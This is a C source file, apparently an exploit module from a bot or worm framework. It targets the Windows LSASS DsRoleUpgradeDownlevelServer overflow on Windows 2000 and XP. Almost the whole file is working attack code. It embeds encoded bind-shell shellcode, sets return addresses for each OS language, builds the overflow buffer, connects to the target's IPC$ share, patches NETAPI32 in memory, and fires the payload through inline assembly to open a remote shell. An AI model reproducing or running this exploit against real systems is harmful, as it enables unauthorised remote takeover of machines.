#include "includes.h"
#include "functions.h"
#include "externs.h"

/*
 * on Win2k we use a call edi in netrap.dll,
 * on WinXP we use a jmp  esp in samsrv.dll.
 */


/* basic alpha shellcode decoder that passes through unicode api */

unsigned char shell_decode[] = {
  0xeb, 0x23, 0x5e, 0x56, 0x5f, 0x81, 0xc7, 0x02, 0xd1, 0xff, 0xff, 0x57,
  0x31, 0xd2, 0x4a, 0x4a, 0x4a, 0xac, 0x2c, 0x41, 0x50, 0x59, 0xac, 0x2c,
  0x41, 0xc0, 0xe0, 0x04, 0x08, 0xc8, 0xaa, 0x39, 0x57, 0xfc, 0x75, 0xed,
  0xc3, 0xe8, 0xd8, 0xff, 0xff, 0xff
};

/* thanks to metasploit.org for their shellcodes */
/* -modified to call ExitThread, not ExitProcess */
/* note : end mark = 0xFFFFFFFD (must be unique) */

unsigned char win32_bind[] = {
  0xe8, 0x38, 0x00, 0x00, 0x00, 0x43, 0x4d, 0x44, 0x00, 0xe7, 0x79, 0xc6,
  0x79, 0xe5, 0x49, 0x86, 0x49, 0xa4, 0xad, 0x2e, 0xe9, 0xa4, 0x1a, 0x70,
  0xc7, 0xd9, 0x09, 0xf5, 0xad, 0xcb, 0xed, 0xfc, 0x3b, 0x8e, 0x4e, 0x0e,
  0xec, 0xef, 0xce, 0xe0, 0x60, 0xad, 0xd9, 0x05, 0xce, 0x72, 0xfe, 0xb3,
  0x16, 0x57, 0x53, 0x32, 0x5f, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00,
  0x01, 0x5b, 0x54, 0x89, 0xe5, 0x89, 0x5d, 0x00, 0x6a, 0x30, 0x59, 0x64,
  0x8b, 0x01, 0x8b, 0x40, 0x0c, 0x8b, 0x70, 0x1c, 0xad, 0x8b, 0x58, 0x08,
  0xeb, 0x0c, 0x8d, 0x57, 0x2c, 0x51, 0x52, 0xff, 0xd0, 0x89, 0xc3, 0x59,
  0xeb, 0x10, 0x6a, 0x08, 0x5e, 0x01, 0xee, 0x6a, 0x0a, 0x59, 0x8b, 0x7d,
  0x00, 0x80, 0xf9, 0x06, 0x74, 0xe4, 0x51, 0x53, 0xff, 0x34, 0x8f, 0xe8,
  0x90, 0x00, 0x00, 0x00, 0x59, 0x89, 0x04, 0x8e, 0xe2, 0xeb, 0x31, 0xff,
  0x66, 0x81, 0xec, 0x90, 0x01, 0x54, 0x68, 0x01, 0x01, 0x00, 0x00, 0xff,
  0x55, 0x20, 0x57, 0x57, 0x57, 0x57, 0x47, 0x57, 0x47, 0x57, 0xff, 0x55,
  0x1c, 0x89, 0xc3, 0x31, 0xff, 0x57, 0x57, 0x68, 0x02, 0x00, 0x22, 0x11,
  0x89, 0xe6, 0x6a, 0x10, 0x56, 0x53, 0xff, 0x55, 0x18, 0x57, 0x53, 0xff,
  0x55, 0x14, 0x57, 0x56, 0x53, 0xff, 0x55, 0x10, 0x89, 0xc2, 0x66, 0x81,
  0xec, 0x54, 0x00, 0x8d, 0x3c, 0x24, 0x31, 0xc0, 0x6a, 0x15, 0x59, 0xf3,
  0xab, 0x89, 0xd7, 0xc6, 0x44, 0x24, 0x10, 0x44, 0xfe, 0x44, 0x24, 0x3d,
  0x89, 0x7c, 0x24, 0x48, 0x89, 0x7c, 0x24, 0x4c, 0x89, 0x7c, 0x24, 0x50,
  0x8d, 0x44, 0x24, 0x10, 0x54, 0x50, 0x51, 0x51, 0x51, 0x41, 0x51, 0x49,
  0x51, 0x51, 0xff, 0x75, 0x00, 0x51, 0xff, 0x55, 0x30, 0x89, 0xe1, 0x68,
  0xff, 0xff, 0xff, 0xff, 0xff, 0x31, 0xff, 0x55, 0x2c, 0x57, 0xff, 0x55,
  0x0c, 0xff, 0x55, 0x28, 0x53, 0x55, 0x56, 0x57, 0x8b, 0x6c, 0x24, 0x18,
  0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x05, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18,
  0x8b, 0x5a, 0x20, 0x01, 0xeb, 0xe3, 0x32, 0x49, 0x8b, 0x34, 0x8b, 0x01,
  0xee, 0x31, 0xff, 0xfc, 0x31, 0xc0, 0xac, 0x38, 0xe0, 0x74, 0x07, 0xc1,
  0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf2, 0x3b, 0x7c, 0x24, 0x14, 0x75, 0xe1,
  0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c,
  0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0xeb, 0x02, 0x31, 0xc0, 0x89,
  0xea, 0x5f, 0x5e, 0x5d, 0x5b, 0xc2, 0x08, 0x00,
  0xfd, 0xff, 0xff, 0xff
};

typedef int (_stdcall *LPFUNC)();
LPFUNC DsRoleUpgradeDownlevelServer;


BOOL CallDS(EXINFO exinfo) {

	DWORD dwOS = OSVersionCheck();
	if (dwOS < OS_WIN2K) return FALSE;

	int ret1 = 0x751c1152; //Win2k en
    int ret2 = 0x75141152; //Win2k fr
    int ret3 = 0x7448f9cb; //WinXP en
	int ret4 = 0x743ff9cb; //WinXP fr


    NETRESOURCE nr;

    char buf_tmp[4096];
    char buf_target[512];
    char buf_ovflow[8192];
    unsigned char *p;
    int i, count=0;
	bool bRetVal = false;

	start:;

	int tType, targetOS;
	targetOS = FpHost(exinfo.ip, FP_LSASS);
	if (targetOS == OS_UNKNOWN) tType = 0;
	else if (targetOS == OS_WINNT) tType = 0;
	else if (targetOS == OS_WIN2K) tType = 1;
	else if (targetOS == OS_WINXP) { tType = 2; count = 3; }
	else tType = 0;

    memset(buf_tmp, 0, sizeof(buf_tmp));
    memset(buf_tmp, 'A', 2241);
    memcpy(buf_tmp + 512, shell_decode, sizeof(shell_decode));
    p = (unsigned char *) ((int) buf_tmp + 512 + sizeof(shell_decode));

	srand(GetTickCount());
    int port = rand() % 32767 + 32768;
	
	win32_bind[166] = port >> 8;
	win32_bind[167] = port & 0xFF;
	
	for(i = 0; i < sizeof(win32_bind); i++ ) {
		*p++ = 0x41 + (win32_bind[i] & 0x0F);
		*p++ = 0x41 + (win32_bind[i] >> 4);
	}

    memset(buf_ovflow, 0, sizeof(buf_ovflow));

    /*printf( "  [+] Retaddr = 0x%08X (%s)\n",
             tt[opt.target].retaddr,
             tt[opt.target].desc );*/

    if (count == 1 || count == 2) {
        int retaddr, len_eip, len_edi;

        if (count == 1) retaddr = ret1; 
		if (count == 2) retaddr = ret2;
        len_eip = 2024;
        len_edi = 2104;

        buf_tmp[len_eip - 4] = (unsigned char) ( retaddr >>  0 );
        buf_tmp[len_eip - 3] = (unsigned char) ( retaddr >>  8 );
        buf_tmp[len_eip - 2] = (unsigned char) ( retaddr >> 16 );
        buf_tmp[len_eip - 1] = (unsigned char) ( retaddr >> 24 );

        buf_tmp[len_edi + 0] = (unsigned char) 0xE8;
        buf_tmp[len_edi + 1] = (unsigned char) 0xC3;
        buf_tmp[len_edi + 2] = (unsigned char) 0xF8;
        buf_tmp[len_edi + 3] = (unsigned char) 0xFF;
        buf_tmp[len_edi + 4] = (unsigned char) 0xFF;

        MultiByteToWideChar( CP_ACP, 0, buf_tmp, strlen( buf_tmp ),
            (unsigned short *) buf_ovflow, sizeof( buf_ovflow ) );
    }

    else if (count == 3 || count == 4) {
        int retaddr, len_eip, len_esp;

        if (count == 3) retaddr = ret3; 
		if (count == 4) retaddr = ret4;
        len_eip = 1968;
        len_esp = 1981;

        buf_tmp[len_eip - 4] = (unsigned char) ( retaddr >>  0 );
        buf_tmp[len_eip - 3] = (unsigned char) ( retaddr >>  8 );
        buf_tmp[len_eip - 2] = (unsigned char) ( retaddr >> 16 );
        buf_tmp[len_eip - 1] = (unsigned char) ( retaddr >> 24 );

        buf_tmp[len_esp + 0] = (unsigned char) 0xE8;
        buf_tmp[len_esp + 1] = (unsigned char) 0x3E;
        buf_tmp[len_esp + 2] = (unsigned char) 0xF9;
        buf_tmp[len_esp + 3] = (unsigned char) 0xFF;
        buf_tmp[len_esp + 4] = (unsigned char) 0xFF;

        memcpy(buf_ovflow, buf_tmp, strlen(buf_tmp));
    }

    //printf( "  [+] Attempting to connect to \\ipc$\n" );

    nr.lpLocalName  = NULL; 
    nr.lpProvider   = NULL; 
    nr.dwType       = RESOURCETYPE_ANY;
	sprintf(buf_tmp, "\\\\%s\\ipc$", exinfo.ip); 
	nr.lpRemoteName = buf_tmp;
    if (fWNetAddConnection2(&nr,"","",0) != NO_ERROR) {
		fWNetCancelConnection2(buf_tmp,0,TRUE);
		return bRetVal;
	}
	
	
	HINSTANCE hNETAPI32 = LoadLibrary("NETAPI32.dll"); if(!hNETAPI32) return bRetVal;
	DsRoleUpgradeDownlevelServer = (LPFUNC) GetProcAddress(hNETAPI32, "DsRoleUpgradeDownlevelServer" );
	if(!DsRoleUpgradeDownlevelServer) return bRetVal;

    //printf( "  [+] Patching DsRoleUpgradeDownlevelServer\n" );

    if(!VirtualProtect(DsRoleUpgradeDownlevelServer, 0x1000, PAGE_READWRITE, (unsigned long *)&i)) return bRetVal;

    p = (unsigned char *) DsRoleUpgradeDownlevelServer;

	for(i=0; i < 128; i++) {
		if(dwOS == OS_WIN2K && p[0] == 0x6A && p[1] == 0x00 && p[2] == 0xE8) {
            p[0] = 0x90;
            p[1] = 0x52;
            break;
		}

        if(dwOS == OS_WINXP && p[0] == 0x50 && p[1] == 0x56 && p[2] == 0xE8 ) { 
			p[1] = 0x52; 
			break; 
		}
		
		p++;
    }

    if (i == 128) return bRetVal;

    memset(buf_target, 0, sizeof(buf_target));

    MultiByteToWideChar(CP_ACP, 0, exinfo.ip, strlen(exinfo.ip),
		(unsigned short *) buf_target, sizeof(buf_target));
	
	if (ConnectShell(exinfo, port) == TRUE) bRetVal = true;
	
	//printf( "  [+] Sending overflow buffer...\n" );
	
	if (bRetVal) launch_sploit(buf_ovflow, buf_target);
	else {
		if (tType == 1 && count == 1) { count++; goto start; }
		else if (tType == 2 && count == 3) { count++; goto start; }
		else if (tType == 0 && count >= 1 && count < 4) { count++; goto start; }
		else return bRetVal;
	}
	
	Sleep(1500);

    return bRetVal;
}

int launch_sploit (char *buf_ovflow, char *buf_target) {
    int err;
    char *buf_filler;

    buf_filler = "A\0A\0\0\0";

    __asm
    {
        mov eax, buf_filler
        mov ecx, 11
		pushargs:
        push eax
        loop pushargs
        mov ecx, buf_ovflow
        mov edx, buf_target
        push ecx
        call DsRoleUpgradeDownlevelServer
        mov err, eax
    }

    return err;
}
